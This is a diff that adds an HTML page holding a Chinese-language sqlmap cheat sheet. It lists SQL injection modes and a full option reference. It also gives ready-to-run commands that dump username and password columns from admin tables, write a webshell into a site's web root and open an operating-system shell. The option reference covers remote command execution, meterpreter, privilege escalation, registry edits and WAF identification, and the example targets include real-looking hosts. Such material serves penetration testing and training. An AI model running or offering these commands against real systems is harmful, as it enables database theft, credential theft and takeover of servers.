@@ -1,0 +1,300 @@
+<!doctype html>
+<html>
+<head>
+<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
+<title>SQLMAP</title>
+</head>
+<body><h3 id='sqlmap简介'>sqlmap简介</h3>
+<p>sqlmap支持五种不同的注入模式：</p>
+<ul>
+<li>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
+<li>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
+<li>4、联合查询注入，可以使用union的情况下的注入。</li>
+<li>5、堆查询注入，可以同时执行多条语句的执行时的注入。</li>
+
+</ul>
+<h3 id='sqlmap支持的数据库有'>sqlmap支持的数据库有</h3>
+<p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
+<h2 id='检测注入'>检测注入</h2>
+<h3 id='基本格式'>基本格式</h3>
+<p>sqlmap -u “<a href='http://www.vuln.cn/post.php?id=1' target='_blank' class='url'>http://www.vuln.cn/post.php?id=1</a>”</p>
+<p>默认使用level1检测全部数据库类型</p>
+<p>sqlmap -u “<a href='http://www.vuln.cn/post.php?id=1' target='_blank' class='url'>http://www.vuln.cn/post.php?id=1</a>”  –dbms mysql –level 3</p>
+<p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
+<h3 id='跟随302跳转'>跟随302跳转</h3>
+<p>当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，
+当注入错误的时候，先报错再跳转的时候，不需要跟随302。
+目的就是：要追踪到错误信息。</p>
+<h3 id='cookie注入'>cookie注入</h3>
+<p>当程序有防get注入的时候，可以使用cookie注入
+sqlmap -u “<a href='http://www.baidu.com/shownews.asp' target='_blank' class='url'>http://www.baidu.com/shownews.asp</a>” –cookie “id=11” –level 2（只有level达到2才会检测cookie）</p>
+<h3 id='从post数据包中注入'>从post数据包中注入</h3>
+<p>可以使用burpsuite或者temperdata等工具来抓取post包</p>
+<p>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql   指定username参数</p>
+<h2 id='注入成功后'>注入成功后</h2>
+<h3 id='获取数据库基本信息'>获取数据库基本信息</h3>
+<p>sqlmap -u “<a href='http://www.vuln.cn/post.php?id=1' target='_blank' class='url'>http://www.vuln.cn/post.php?id=1</a>”  –dbms mysql –level 3 –dbs</p>
+<p>查询有哪些数据库</p>
+<p>sqlmap -u “<a href='http://www.vuln.cn/post.php?id=1' target='_blank' class='url'>http://www.vuln.cn/post.php?id=1</a>”  –dbms mysql –level 3 -D test –tables</p>
+<p>查询test数据库中有哪些表</p>
+<p>sqlmap -u “<a href='http://www.vuln.cn/post.php?id=1' target='_blank' class='url'>http://www.vuln.cn/post.php?id=1</a>”  –dbms mysql –level 3 -D test -T admin –columns</p>
+<p>查询test数据库中admin表有哪些字段</p>
+<p>sqlmap -u “<a href='http://www.vuln.cn/post.php?id=1' target='_blank' class='url'>http://www.vuln.cn/post.php?id=1</a>”  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump</p>
+<p>dump出字段username与password中的数据</p>
+<p>其他命令参考下面</p>
+<h3 id='从数据库中搜索字段'>从数据库中搜索字段</h3>
+<p>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password
+在dedecms数据库中搜索字段admin或者password。</p>
+<h3 id='读取与写入文件'>读取与写入文件</h3>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
+–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
+–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+#示例：
+sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p>
+<p>使用shell命令：</p>
+<p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell
+接下来指定网站可写目录：
+“E:\php\htdocs\dvwa”</p>
+<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
+<h2 id='sqlmap详细命令'>sqlmap详细命令：</h2>
+<ul>
+<li>–is-dba 当前用户权限（是否为root权限）</li>
+<li>–dbs 所有数据库</li>
+<li>–current-db 网站当前数据库</li>
+<li>–users 所有数据库用户</li>
+<li>–current-user 当前数据库用户</li>
+<li>–random-agent 构造随机user-agent</li>
+<li>–passwords 数据库密码</li>
+<li>–proxy <a href='http://local:8080' target='_blank' class='url'>http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</li>
+<li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+<li>--dump 获取表中的数据，包含列</li>
+<li>--dump-all 转存DBMS数据库所有表项目</li>
+<li>--level 测试等级(1-5)， 默认为1 </li>
+<li>读取数据---&gt;读取表--读取表的列---&gt;获取内容</li>
+<li>-D 指定数据库</li>
+<li>-T 指定表 </li>
+<li>-C 指定列</li>
+<li>--dbms=mysql oracle mssql 指定数据库</li>
+<li>--privileges 列出数据库管理员权限</li>
+<li>sqlmap.py -u &quot;<a href='http://xx.com/int.php?id=1' target='_blank' class='url'>http://xx.com/int.php?id=1</a>&quot; --schema --batch --exclude-sysdbs</li>
+
+</ul>
+<h3 id='测试等级'>测试等级</h3>
+<p>参数:  --level
+共有五个等级，默认为1，sqImap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。
+这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。
+总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的Ievel值。</p>
+<h3 id='显示调试信息'>显示调试信息</h3>
+<ul>
+<li>-V显示调试信息有7个级别</li>
+<li>0、只显示python错误以及严重的信息。</li>
+<li>1、同时显示基本信息和警告信息。 (默认)</li>
+<li>2、同时显示debug信息。</li>
+<li>3、同时显示注入的payload。</li>
+<li>4、同时显示HTTP请求。</li>
+<li>5、同时显示HTTP响应头。</li>
+<li>6、同时显示HTTP响应页面。</li>
+
+</ul>
+<h3 id='options选项）'>Options（选项）：</h3>
+<ul>
+<li>–version 显示程序的版本号并退出</li>
+<li>-h, –help 显示此帮助消息并退出</li>
+<li>-v VERBOSE 详细级别：0-6（默认为1）</li>
+<li>--batch  自动确认</li>
+<li>保存进度继续跑：</li>
+
+</ul>
+<p>sqlmap -u “<a href='http://url/news?id=1' target='_blank' class='url'>http://url/news?id=1</a>“ –dbs-o “sqlmap.log” 保存进度
+sqlmap -u “<a href='http://url/news?id=1' target='_blank' class='url'>http://url/news?id=1</a>“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</p>
+<h3 id='target目标）'>Target（目标）：</h3>
+<p>以下至少需要设置其中一个选项，设置目标URL。</p>
+<ul>
+<li>-d DIRECT 直接连接到数据库。</li>
+<li>-u URL, –url=URL 目标URL。</li>
+<li>-m 从文本中获取多个目标</li>
+<li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
+<li>-r REQUESTFILE ，sqImap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数(比如cookie, POST数据， 等等)</li>
+<li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
+<li>-c CONFIGFILE 从INI配置文件中加载选项。</li>
+
+</ul>
+<h3 id='request请求）'>Request（请求）：</h3>
+<p>这些选项可以用来指定如何连接到目标URL。</p>
+<ul>
+<li>–data=DATA 通过POST发送的数据字符串</li>
+<li>-param-del 参数拆分字符，当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</li>
+<li>–cookie=COOKIE HTTP Cookie头</li>
+<li>–cookie-urlencode URL 编码生成的cookie注入</li>
+<li>–drop-set-cookie 忽略响应的Set – Cookie头信息</li>
+<li>–user-agent=AGENT 指定 HTTP User – Agent头</li>
+<li>–random-agent 使用随机选定的HTTP User – Agent头</li>
+<li>–referer=REFERER 指定 HTTP Referer头      level3</li>
+<li>–headers=HEADERS 换行分开，加入其他的HTTP头</li>
+<li>–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
+<li>–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）</li>
+<li>–auth-cert=ACERT HTTP认证证书（key_file，cert_file）</li>
+<li>–proxy=PROXY 使用HTTP代理连接到目标URL</li>
+<li>–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）</li>
+<li>–ignore-proxy 忽略系统默认的HTTP代理</li>
+<li>–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li>
+<li>–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）</li>
+<li>–retries=RETRIES 连接超时后重新连接的时间（默认3）</li>
+<li>–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li>
+<li>–safe-url=SAFURL 在测试过程中经常访问的url地址</li>
+<li>–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</li>
+
+</ul>
+<h3 id='enumeration枚举）'>Enumeration（枚举）：</h3>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行
+您自己的SQL语句。</p>
+<ul>
+<li>-b, –banner 检索数据库管理系统的标识</li>
+<li>–current-user 检索数据库管理系统当前用户</li>
+<li>–current-db 检索数据库管理系统当前数据库</li>
+<li>–is-dba 检测DBMS当前用户是否DBA</li>
+<li>–users 枚举数据库管理系统用户</li>
+<li>–passwords 枚举数据库管理系统用户密码哈希</li>
+<li>–privileges 枚举数据库管理系统用户的权限</li>
+<li>–roles 枚举数据库管理系统用户的角色</li>
+<li>–dbs 枚举数据库管理系统数据库</li>
+<li>-D DBname 要进行枚举的指定数据库名</li>
+<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</li>
+<li>–tables 枚举的DBMS数据库中的表</li>
+<li>–columns 枚举DBMS数据库表列</li>
+<li>–dump 转储数据库管理系统的数据库中的表项</li>
+<li>–dump-all 转储所有的DBMS数据库表中的条目</li>
+<li>–search 搜索列（S），表（S）和/或数据库名称（S）</li>
+<li>-C COL 要进行枚举的数据库列</li>
+<li>-U USER 用来进行枚举的数据库用户</li>
+<li>–exclude-sysdbs 枚举表时排除系统数据库</li>
+<li>–start=LIMITSTART 第一个查询输出进入检索</li>
+<li>–stop=LIMITSTOP 最后查询的输出进入检索</li>
+<li>–first=FIRSTCHAR 第一个查询输出字的字符检索</li>
+<li>–last=LASTCHAR 最后查询的输出字字符检索</li>
+<li>–sql-query=QUERY 要执行的SQL语句</li>
+<li>–sql-shell 提示交互式SQL的shell</li>
+
+</ul>
+<h3 id='optimization优化）'>Optimization（优化）：</h3>
+<p>这些选项可用于优化SqlMap的性能。</p>
+<ul>
+<li>-o 开启所有优化开关</li>
+<li>–predict-output 预测常见的查询输出</li>
+<li>–keep-alive 使用持久的HTTP（S）连接</li>
+<li>–null-connection 从没有实际的HTTP响应体中检索页面长度</li>
+<li>–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
+
+</ul>
+<h3 id='injection注入）'>Injection（注入）：</h3>
+<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
+<ul>
+<li>-p TESTPARAMETER 可测试的参数（S）</li>
+<li>–dbms=DBMS 强制后端的DBMS为此值</li>
+<li>–os=OS 强制后端的DBMS操作系统为这个值</li>
+<li>–prefix=PREFIX 注入payload字符串前缀</li>
+<li>–suffix=SUFFIX 注入payload字符串后缀</li>
+<li>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</li>
+
+</ul>
+<h3 id='detection检测）'>Detection（检测）：</h3>
+<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
+<ul>
+<li>–level=LEVEL 执行测试的等级（1-5，默认为1）</li>
+<li>–risk=RISK 执行测试的风险（0-3，默认为1）</li>
+<li>–string=STRING 查询时有效时在页面匹配字符串</li>
+<li>–regexp=REGEXP 查询时有效时在页面匹配正则表达式</li>
+<li>–text-only 仅基于在文本内容比较网页</li>
+
+</ul>
+<h3 id='techniques技巧）'>Techniques（技巧）：</h3>
+<p>这些选项可用于调整具体的SQL注入测试。</p>
+<ul>
+<li>–technique=TECH SQL注入技术测试（默认BEUST）</li>
+<li>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+<li>–union-cols=UCOLS 定列范围用于测试UNION查询注入</li>
+<li>–union-char=UCHAR 用于暴力猜解列数的字符</li>
+
+</ul>
+<h3 id='fingerprint指纹）'>Fingerprint（指纹）：</h3>
+<ul>
+<li>-f, –fingerprint 执行检查广泛的DBMS版本指纹</li>
+
+</ul>
+<h3 id='brute-force蛮力）'>Brute force（蛮力）：</h3>
+<p>这些选项可以被用来运行蛮力检查。</p>
+<ul>
+<li>–common-tables 检查存在共同表</li>
+<li>–common-columns 检查存在共同列</li>
+
+</ul>
+<p>User-defined function injection（用户自定义函数注入）：
+这些选项可以用来创建用户自定义函数。</p>
+<p>–udf-inject 注入用户自定义函数
+–shared-lib=SHLIB 共享库的本地路径</p>
+<h3 id='file-system-access访问文件系统）'>File system access（访问文件系统）：</h3>
+<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<ul>
+<li>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件</li>
+<li>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
+<li>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</li>
+
+</ul>
+<h3 id='operating-system-access操作系统访问）'>Operating system access（操作系统访问）：</h3>
+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<ul>
+<li>–os-cmd=OSCMD 执行操作系统命令</li>
+<li>–os-shell 交互式的操作系统的shell</li>
+<li>–os-pwn 获取一个OOB shell，meterpreter或VNC</li>
+<li>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
+<li>–os-bof 存储过程缓冲区溢出利用</li>
+<li>–priv-esc 数据库进程用户权限提升</li>
+<li>–msf-path=MSFPATH Metasploit Framework本地的安装路径</li>
+<li>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</li>
+
+</ul>
+<h3 id='windows注册表访问'>Windows注册表访问：</h3>
+<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<ul>
+<li>–reg-read 读一个Windows注册表项值</li>
+<li>–reg-add 写一个Windows注册表项值数据</li>
+<li>–reg-del 删除Windows注册表键值</li>
+<li>–reg-key=REGKEY Windows注册表键</li>
+<li>–reg-value=REGVAL Windows注册表项值</li>
+<li>–reg-data=REGDATA Windows注册表键值数据</li>
+<li>–reg-type=REGTYPE Windows注册表项值类型</li>
+
+</ul>
+<p>这些选项可以用来设置一些一般的工作参数。</p>
+<ul>
+<li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
+<li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
+<li>–flush-session 刷新当前目标的会话文件</li>
+<li>–fresh-queries 忽略在会话文件中存储的查询结果</li>
+<li>–eta 显示每个输出的预计到达时间</li>
+<li>–update 更新SqlMap</li>
+<li>–save file保存选项到INI配置文件</li>
+<li>–batch 从不询问用户输入，使用所有默认配置。</li>
+
+</ul>
+<h3 id='miscellaneous杂项）'>Miscellaneous（杂项）：</h3>
+<ul>
+<li>–beep 发现SQL注入时提醒</li>
+<li>–check-payload IDS对注入payloads的检测测试</li>
+<li>–cleanup SqlMap具体的UDF和表清理DBMS</li>
+<li>–forms 对目标URL的解析和测试形式</li>
+<li>–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
+<li>–page-rank Google dork结果显示网页排名（PR）</li>
+<li>–parse-errors 从响应页面解析数据库管理系统的错误消息</li>
+<li>–replicate 复制转储的数据到一个sqlite3数据库</li>
+<li>–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</li>
+<li>–wizard 给初级用户的简单向导界面</li>
+<li>--identify-waf    sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。</li>
+<li>--check-waf   WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。sqlmap将会使用一个不存在的参数来注入测试</li>
+
+</ul>
+<p>&nbsp;</p>
+</body>
+</html>
